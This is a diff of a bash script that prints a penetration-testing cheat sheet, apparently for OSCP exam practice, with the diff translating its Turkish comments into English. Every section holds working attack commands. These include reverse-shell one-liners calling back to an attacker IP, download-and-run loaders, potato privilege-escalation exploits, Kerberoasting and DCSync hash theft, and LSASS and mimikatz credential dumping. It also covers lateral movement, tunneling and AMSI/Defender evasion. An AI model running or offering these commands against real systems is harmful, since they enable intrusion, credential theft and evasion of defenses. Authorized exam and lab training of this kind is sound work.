@@ -70,25 +70,25 @@ if [ "$COMPACT" -eq 1 ]; then
     # PHASE 1 - RECON & ENUMERATION
     # =========================================================
     if show listener; then
-    sec "[1] LISTENER  (Kali - shell beklemek icin)"
+    sec "[1] LISTENER  (Kali side - waiting for incoming shell)"
     row "nc"         "rlwrap nc -lvnp 4444"
     row "pwncat"     "pwncat-cs -lp 4444   ${DIM}# auto TTY upgrade${NC}"
     row "msf"        "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $IP; set LPORT 4444; run'"
     fi
 
     if show revshell; then
-    sec "[2] REVERSE SHELL  (hedefte calistir, LHOST=$IP LPORT=4444)"
+    sec "[2] REVERSE SHELL  (run on target, LHOST=$IP LPORT=4444)"
     row "bash"       "bash -c 'bash -i >& /dev/tcp/$IP/4444 0>&1'"
     row "python3"    "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$IP\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'"
     row "perl"       "perl -e 'use Socket;\$i=\"$IP\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
     row "ps-tcp"     "iex (iwr $URL/revshells/Invoke-PowerShellTcp.ps1 -UB).Content; Invoke-PowerShellTcp -Reverse -IPAddress $IP -Port 4444"
     row "powercat"   "iex (iwr $URL/revshells/powercat.ps1 -UB).Content; powercat -c $IP -p 4444 -e cmd"
-    row "php"        "${DIM}# web target'a yukle:${NC} $URL/revshells/php-reverse-shell.php"
+    row "php"        "${DIM}# upload to web target:${NC} $URL/revshells/php-reverse-shell.php"
     row "tty-fix"    "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  ${DIM}# CTRL+Z; stty raw -echo; fg; export TERM=xterm-256color${NC}"
     fi
 
     if show linux; then
-    sec "[3] LINUX ENUM & PRIVESC  (shell aldiktan sonra)"
+    sec "[3] LINUX ENUM & PRIVESC  (after catching shell)"
     row "linpeas"    "wget $URL/linux/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh"
     row "lse"        "wget $URL/linux/lse.sh -O /tmp/lse && chmod +x /tmp/lse && /tmp/lse -l2"
     row "les"        "wget $URL/linux/linux-exploit-suggester.sh -O /tmp/les && bash /tmp/les"
@@ -96,9 +96,9 @@ if [ "$COMPACT" -eq 1 ]; then
     fi
 
     if show windows; then
-    sec "[4a] WINDOWS ENUM & PRIVESC  (iwr -OutFile, AV yoksa)"
+    sec "[4a] WINDOWS ENUM & PRIVESC  (iwr -OutFile, when no AV)"
     row "winpeas"    "iwr $URL/windows/winPEASx64.exe -o \$env:TEMP\\wp.exe; & \$env:TEMP\\wp.exe"
-    row "privescchk" "iwr $URL/windows/PrivescCheck.ps1 -o \$env:TEMP\\pc.ps1; . \$env:TEMP\\pc.ps1; Invoke-PrivescCheck   ${DIM}# winPEAS'tan hizli ve sessiz${NC}"
+    row "privescchk" "iwr $URL/windows/PrivescCheck.ps1 -o \$env:TEMP\\pc.ps1; . \$env:TEMP\\pc.ps1; Invoke-PrivescCheck   ${DIM}# faster and stealthier than winPEAS${NC}"
     row "powerup"    "iwr $URL/windows/PowerUp.ps1 -o \$env:TEMP\\pu.ps1; . \$env:TEMP\\pu.ps1; Invoke-AllChecks"
     row "sherlock"   "iwr $URL/windows/Sherlock.ps1 -o \$env:TEMP\\sh.ps1; . \$env:TEMP\\sh.ps1; Find-AllVulns"
     row "jaws"       "iwr $URL/windows/jaws-enum.ps1 -o \$env:TEMP\\j.ps1; powershell -ep bypass -f \$env:TEMP\\j.ps1"
@@ -107,76 +107,76 @@ if [ "$COMPACT" -eq 1 ]; then
     fi
 
     if show tokens; then
-    sec "[4b] TOKEN ABUSE  (SeImpersonate/SeAssignPrimaryToken varsa - IIS/MSSQL/web shell'lerinde altin)"
-    row "juicypot"   "iwr $URL/windows/JuicyPotato.exe -o \$env:TEMP\\jp.exe; & \$env:TEMP\\jp.exe -t * -p cmd.exe -a '/c whoami' -l 9001   ${DIM}# Win < 1809 (eski sistemler)${NC}"
-    row "juicypotng" "iwr $URL/windows/JuicyPotatoNG.exe -o \$env:TEMP\\jpng.exe; & \$env:TEMP\\jpng.exe -t * -p cmd.exe -a '/c whoami'   ${DIM}# Win 1809+ (yeni)${NC}"
-    row "printspoof" "iwr $URL/windows/PrintSpoofer64.exe -o \$env:TEMP\\ps.exe; & \$env:TEMP\\ps.exe -i -c cmd   ${DIM}# Win10 1809+ / 2019 (en cok kullanilan)${NC}"
-    row "godpotato"  "iwr $URL/windows/GodPotato-NET4.exe -o \$env:TEMP\\gp.exe; & \$env:TEMP\\gp.exe -cmd 'cmd /c whoami'   ${DIM}# PrintSpoofer patch'lendiyse, en yeni${NC}"
+    sec "[4b] TOKEN ABUSE  (when SeImpersonate/SeAssignPrimaryToken is set - gold in IIS/MSSQL/web shells)"
+    row "juicypot"   "iwr $URL/windows/JuicyPotato.exe -o \$env:TEMP\\jp.exe; & \$env:TEMP\\jp.exe -t * -p cmd.exe -a '/c whoami' -l 9001   ${DIM}# Win < 1809 (older systems)${NC}"
+    row "juicypotng" "iwr $URL/windows/JuicyPotatoNG.exe -o \$env:TEMP\\jpng.exe; & \$env:TEMP\\jpng.exe -t * -p cmd.exe -a '/c whoami'   ${DIM}# Win 1809+ (newer)${NC}"
+    row "printspoof" "iwr $URL/windows/PrintSpoofer64.exe -o \$env:TEMP\\ps.exe; & \$env:TEMP\\ps.exe -i -c cmd   ${DIM}# Win10 1809+ / 2019 (most common)${NC}"
+    row "godpotato"  "iwr $URL/windows/GodPotato-NET4.exe -o \$env:TEMP\\gp.exe; & \$env:TEMP\\gp.exe -cmd 'cmd /c whoami'   ${DIM}# if PrintSpoofer is patched, latest fallback${NC}"
     fi
 
     if show ad-recon; then
-    sec "[5a] AD RECON  (domain bilgisi toplama)"
+    sec "[5a] AD RECON  (domain enumeration)"
     row "powerview"  "iwr $URL/ad/PowerView.ps1 -o \$env:TEMP\\pv.ps1; . \$env:TEMP\\pv.ps1   ${DIM}# Get-NetUser, Get-NetGroup, Find-LocalAdminAccess${NC}"
     row "sharphound" "iex (iwr $URL/ad/SharpHound.ps1 -UB).Content; Invoke-BloodHound -CollectionMethod All"
     row "adpeas"     "iex (iwr $URL/enum/adPEAS.ps1 -UB).Content; Invoke-adPEAS"
     row "kerbrute"   "/tmp/kb userenum --dc <DC> -d <DOMAIN> users.txt   ${DIM}# wget $URL/ad/kerbrute_linux -O /tmp/kb${NC}"
-    row "enum4lin"   "python3 $URL/enum/enum4linux-ng.py -A <target>   ${DIM}# Kali'de calistir${NC}"
-    row "lapstk"     "iex (iwr $URL/ad/LAPSToolkit.ps1 -UB).Content; Get-LAPSComputers; Get-LAPSPasswords   ${DIM}# LAPS okuma yetkin varsa local admin pass${NC}"
+    row "enum4lin"   "python3 $URL/enum/enum4linux-ng.py -A <target>   ${DIM}# run on Kali${NC}"
+    row "lapstk"     "iex (iwr $URL/ad/LAPSToolkit.ps1 -UB).Content; Get-LAPSComputers; Get-LAPSPasswords   ${DIM}# if you can read LAPS, recovers local admin password${NC}"
     fi
 
     if show kerberoast; then
-    sec "[5b] AD ATTACK - Kerberoast  (SPN'li service account'larin TGS hash'i)"
+    sec "[5b] AD ATTACK - Kerberoast  (TGS hashes of SPN-enabled service accounts)"
     row "rubeus"     "iwr $URL/ad/Rubeus.exe -o \$env:TEMP\\r.exe; & \$env:TEMP\\r.exe kerberoast /outfile:hashes.txt /nowrap"
-    row "impacket"   "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC> -request -outputfile hashes.txt   ${DIM}# Kali'de${NC}"
+    row "impacket"   "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC> -request -outputfile hashes.txt   ${DIM}# on Kali${NC}"
     row "crack"      "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt"
     fi
 
     if show asreproast; then
-    sec "[5c] AD ATTACK - AS-REPRoast  (DONT_REQ_PREAUTH ozelligi olan user'lar)"
+    sec "[5c] AD ATTACK - AS-REPRoast  (users with DONT_REQ_PREAUTH flag)"
     row "rubeus"     "& \$env:TEMP\\r.exe asreproast /format:hashcat /outfile:asrep.txt /nowrap"
-    row "impacket"   "impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC> -usersfile users.txt -format hashcat -outputfile asrep.txt   ${DIM}# Kali, kimliksiz${NC}"
+    row "impacket"   "impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC> -usersfile users.txt -format hashcat -outputfile asrep.txt   ${DIM}# Kali, unauthenticated${NC}"
     row "crack"      "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
     fi
 
     if show dcsync; then
-    sec "[5d] AD ATTACK - DCSync  (DA/Replication hakki olunca tum domain hash'leri)"
-    row "mimikatz"   "lsadump::dcsync /domain:<DOMAIN> /user:Administrator   ${DIM}# mimikatz icinde${NC}"
+    sec "[5d] AD ATTACK - DCSync  (with DA / Replication rights, dump all domain hashes)"
+    row "mimikatz"   "lsadump::dcsync /domain:<DOMAIN> /user:Administrator   ${DIM}# inside mimikatz${NC}"
     row "mimi-all"   "lsadump::dcsync /domain:<DOMAIN> /all /csv"
-    row "secretsdmp" "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC>   ${DIM}# Kali, dahili DCSync${NC}"
-    row "just-dc"    "impacket-secretsdump -just-dc-ntlm <DOMAIN>/<USER>:<PASS>@<DC>   ${DIM}# sadece NTDS (sessiz)${NC}"
+    row "secretsdmp" "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC>   ${DIM}# Kali, built-in DCSync${NC}"
+    row "just-dc"    "impacket-secretsdump -just-dc-ntlm <DOMAIN>/<USER>:<PASS>@<DC>   ${DIM}# NTDS only (stealthier)${NC}"
     fi
 
     if show runas; then
-    sec "[5e] AD ATTACK - RunasCs  (cred bul → o user olarak komut calistir, lateral)"
+    sec "[5e] AD ATTACK - RunasCs  (use stolen creds to run commands as that user)"
     row "runas-exe"  "iwr $URL/windows/RunasCs.exe -o \$env:TEMP\\rc.exe; & \$env:TEMP\\rc.exe <USER> <PASS> 'cmd.exe /c whoami'"
-    row "runas-rev"  "& \$env:TEMP\\rc.exe <USER> <PASS> -r $IP:4445   ${DIM}# direkt revshell, listener ac${NC}"
+    row "runas-rev"  "& \$env:TEMP\\rc.exe <USER> <PASS> -r $IP:4445   ${DIM}# direct revshell, open a listener${NC}"
     row "runas-net"  "& \$env:TEMP\\rc.exe <USER> <PASS> -l 8 'cmd /c dir \\\\<DC>\\C\$'   ${DIM}# logon type 8 = double-hop fix${NC}"
     row "runas-ps1"  "iex (iwr $URL/windows/Invoke-RunasCs.ps1 -UB).Content; Invoke-RunasCs <USER> <PASS> 'whoami'"
     fi
 
     if show lateral; then
-    sec "[5f] LATERAL MOVEMENT - PsExec  (Windows→Windows, admin creds gerekli)"
+    sec "[5f] LATERAL MOVEMENT - PsExec  (Windows→Windows, requires admin creds)"
     row "psexec-cmd" "iwr $URL/transfer/PsExec64.exe -o \$env:TEMP\\px.exe; & \$env:TEMP\\px.exe -accepteula \\\\<TARGET> -u <DOMAIN>\\<USER> -p <PASS> cmd.exe"
-    row "psexec-sys" "& \$env:TEMP\\px.exe -accepteula -s \\\\<TARGET> cmd.exe   ${DIM}# -s = SYSTEM olarak (zaten admin'sen)${NC}"
-    row "psexec-py"  "impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>   ${DIM}# Kali'den, hash de gecer (-hashes)${NC}"
-    row "wmiexec-py" "impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>   ${DIM}# psexec yakalanirsa, daha sessiz${NC}"
-    row "smbexec-py" "impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET>   ${DIM}# psexec'in dosya brakmayan versiyonu${NC}"
-    row "evil-winrm" "evil-winrm -i <TARGET> -u <USER> -p <PASS>   ${DIM}# WinRM (5985/5986) acik ise${NC}"
+    row "psexec-sys" "& \$env:TEMP\\px.exe -accepteula -s \\\\<TARGET> cmd.exe   ${DIM}# -s = run as SYSTEM (when already admin)${NC}"
+    row "psexec-py"  "impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>   ${DIM}# from Kali, also accepts -hashes${NC}"
+    row "wmiexec-py" "impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>   ${DIM}# stealthier than psexec${NC}"
+    row "smbexec-py" "impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET>   ${DIM}# psexec without dropping a file${NC}"
+    row "evil-winrm" "evil-winrm -i <TARGET> -u <USER> -p <PASS>   ${DIM}# if WinRM (5985/5986) is open${NC}"
     fi
 
     if show powerupsql; then
-    sec "[5g] AD ATTACK - PowerUpSQL  (MSSQL Server abuse, sinavda sik gorulur)"
+    sec "[5g] AD ATTACK - PowerUpSQL  (MSSQL Server abuse, common on OSCP)"
     row "find-sql"   "iex (iwr $URL/windows/PowerUpSQL.ps1 -UB).Content; Get-SQLInstanceDomain | Get-SQLConnectionTest -Verbose"
     row "audit"      "Get-SQLInstanceDomain | Get-SQLServerInfo | ft -Auto   ${DIM}# version/edition/sysadmin?${NC}"
-    row "xp-cmd"     "Get-SQLInstanceDomain | Invoke-SQLOSCmd -Command 'whoami' -Verbose   ${DIM}# xp_cmdshell ile RCE${NC}"
-    row "linked"     "Get-SQLServerLinkCrawl -Instance '<HOST>\\<INST>' -Query 'select system_user'   ${DIM}# linked server zinciri${NC}"
-    row "imperson"   "Get-SQLInstanceDomain | Invoke-SQLImpersonateService -Verbose   ${DIM}# IMPERSONATE yetkisi varsa sa olunur${NC}"
-    row "audit-all"  "Get-SQLInstanceDomain | Invoke-SQLAudit -Verbose   ${DIM}# tum kontroller, en hizli yol${NC}"
+    row "xp-cmd"     "Get-SQLInstanceDomain | Invoke-SQLOSCmd -Command 'whoami' -Verbose   ${DIM}# RCE via xp_cmdshell${NC}"
+    row "linked"     "Get-SQLServerLinkCrawl -Instance '<HOST>\\<INST>' -Query 'select system_user'   ${DIM}# linked server chain${NC}"
+    row "imperson"   "Get-SQLInstanceDomain | Invoke-SQLImpersonateService -Verbose   ${DIM}# if IMPERSONATE is granted, become sa${NC}"
+    row "audit-all"  "Get-SQLInstanceDomain | Invoke-SQLAudit -Verbose   ${DIM}# all checks, fastest path${NC}"
     fi
 
     if show coercion; then
     sec "[5h] AD ATTACK - Coercion + AD CS"
-    row "petitpotam" "python3 /tmp/pp.py $IP <DC>   ${DIM}# DC'yi NTLM authenticate ettir → Responder/ntlmrelay${NC}"
+    row "petitpotam" "python3 /tmp/pp.py $IP <DC>   ${DIM}# coerce DC NTLM auth → Responder / ntlmrelayx${NC}"
     row "certify"    "iwr $URL/ad/Certify.exe -o \$env:TEMP\\c.exe; & \$env:TEMP\\c.exe find /vulnerable"
     row "ntlmrelay"  "impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
     fi
@@ -184,44 +184,44 @@ if [ "$COMPACT" -eq 1 ]; then
     if show dump; then
     sec "[5i] CREDENTIAL DUMP"
     row "mimikatz"   "iwr $URL/ad/mimikatz_trunk.zip -o m.zip; Expand-Archive m.zip; .\\m\\x64\\mimikatz.exe   ${DIM}# privilege::debug; sekurlsa::logonpasswords${NC}"
-    row "safetykatz" "iwr $URL/ad/SafetyKatz.exe -o \$env:TEMP\\sk.exe; & \$env:TEMP\\sk.exe   ${DIM}# Defender bypass mimikatz${NC}"
-    row "lazagne-w"  "iwr $URL/ad/LaZagne.exe -o \$env:TEMP\\lz.exe; & \$env:TEMP\\lz.exe all   ${DIM}# browser/wifi/mail/RDP/DB${NC}"
+    row "safetykatz" "iwr $URL/ad/SafetyKatz.exe -o \$env:TEMP\\sk.exe; & \$env:TEMP\\sk.exe   ${DIM}# Defender-evading mimikatz${NC}"
+    row "lazagne-w"  "iwr $URL/ad/LaZagne.exe -o \$env:TEMP\\lz.exe; & \$env:TEMP\\lz.exe all   ${DIM}# browser/wifi/mail/RDP/DB creds${NC}"
     row "lazagne-l"  "wget $URL/linux/laZagne.py -O /tmp/lz.py && python3 /tmp/lz.py all"
-    row "comsvcs"    "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \$env:TEMP\\l.dmp full   ${DIM}# LSASS dump (admin)${NC}"
+    row "comsvcs"    "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \$env:TEMP\\l.dmp full   ${DIM}# LSASS dump (needs admin)${NC}"
     fi
 
     if show transfer; then
-    sec "[6] FILE TRANSFER  (kucuk binary'ler icin)"
+    sec "[6] FILE TRANSFER  (for small binaries)"
     row "nc-win"     "iwr $URL/transfer/nc.exe -o nc.exe; .\\nc.exe -e cmd.exe $IP 4444"
     row "plink"      "iwr $URL/transfer/plink.exe -o plink.exe; .\\plink.exe -ssh -l kali -pw <pw> -R 4444:127.0.0.1:4444 $IP"
     row "socat-lin"  "wget $URL/transfer/socat-linux-x64 -O /tmp/socat && chmod +x /tmp/socat"
-    row "smb-share"  "${DIM}# Kali:${NC} impacket-smbserver share \$PWD -smb2support   ${DIM}# Hedef:${NC} copy \\\\$IP\\share\\file.exe"
+    row "smb-share"  "${DIM}# Kali:${NC} impacket-smbserver share \$PWD -smb2support   ${DIM}# Target:${NC} copy \\\\$IP\\share\\file.exe"
     fi
 
     if show pivot; then
-    sec "[7] PIVOT / TUNNEL  (ic agda devam etmek icin)"
+    sec "[7] PIVOT / TUNNEL  (continue into the internal network)"
     row "chisel-srv" "${DIM}# Kali:${NC} ./tools/transfer/chisel-linux server -p 4444 --reverse"
     row "chisel-lin" "wget $URL/transfer/chisel-linux -O /tmp/c && chmod +x /tmp/c && /tmp/c client $IP:4444 R:1080:socks"
     row "chisel-win" "iwr $URL/transfer/chisel-windows.exe -o c.exe; .\\c.exe client $IP:4444 R:1080:socks"
     row "ligolo-srv" "${DIM}# Kali:${NC} sudo ip tuntap add user \$USER mode tun ligolo && sudo ip link set ligolo up && ./tools/transfer/ligolo-proxy -selfcert"
     row "ligolo-lin" "wget $URL/transfer/ligolo-agent-linux -O /tmp/lagent && chmod +x /tmp/lagent && /tmp/lagent -connect $IP:11601 -ignore-cert"
     row "ligolo-win" "iwr $URL/transfer/ligolo-agent-windows.exe -o la.exe; .\\la.exe -connect $IP:11601 -ignore-cert"
-    row "proxychns"  "${DIM}# /etc/proxychains4.conf'a:${NC} socks5 127.0.0.1 1080  ${DIM}# Kullanim:${NC} proxychains nmap -sT <hedef>"
+    row "proxychns"  "${DIM}# add to /etc/proxychains4.conf:${NC} socks5 127.0.0.1 1080  ${DIM}# usage:${NC} proxychains nmap -sT <target>"
     fi
 
     if show fallback; then
-    sec "[F] FALLBACK PATTERNS  (yukaridaki komut takilirsa donusumler)"
+    sec "[F] FALLBACK PATTERNS  (transformations when the command above gets blocked)"
     echo -e "${DIM}  iwr -o blocked    →  iex (iwr URL -UB).Content                  (in-memory, disk yok)${NC}"
     echo -e "${DIM}  PowerShell yok    →  certutil -urlcache -split -f URL out.exe   (cmd.exe ile)${NC}"
     echo -e "${DIM}  certutil yok      →  bitsadmin /transfer N URL out.exe          (eski Windows)${NC}"
     echo -e "${DIM}  AMSI takiliyor    →  ./amsi_b64.sh \"iex (iwr URL -UB).Content\"  (base64+bypass)${NC}"
     echo -e "${DIM}  ExecutionPolicy   →  powershell -ep bypass -f file.ps1${NC}"
-    echo -e "${DIM}  ConstrainedLang   →  exe kullan, ps1 unut (Rubeus/Seatbelt/Sharphound .exe)${NC}"
+    echo -e "${DIM}  ConstrainedLang   →  use .exe builds, drop .ps1 (Rubeus/Seatbelt/Sharphound)${NC}"
     fi
 
     if [ "$SECTION" = "all" ]; then
         echo
-        echo -e "${YELLOW}Detay:${NC}  ${GREEN}./payloads.sh <tool>${NC}    ${YELLOW}AMSI bypass:${NC}  ${GREEN}./amsi_b64.sh '<cmd>'${NC}    ${YELLOW}msfvenom:${NC}  ${GREEN}./msfgen.sh windows 4444${NC}"
+        echo -e "${YELLOW}Details:${NC}  ${GREEN}./payloads.sh <tool>${NC}    ${YELLOW}AMSI bypass:${NC}  ${GREEN}./amsi_b64.sh '<cmd>'${NC}    ${YELLOW}msfvenom:${NC}  ${GREEN}./msfgen.sh windows 4444${NC}"
     fi
     exit 0
 fi
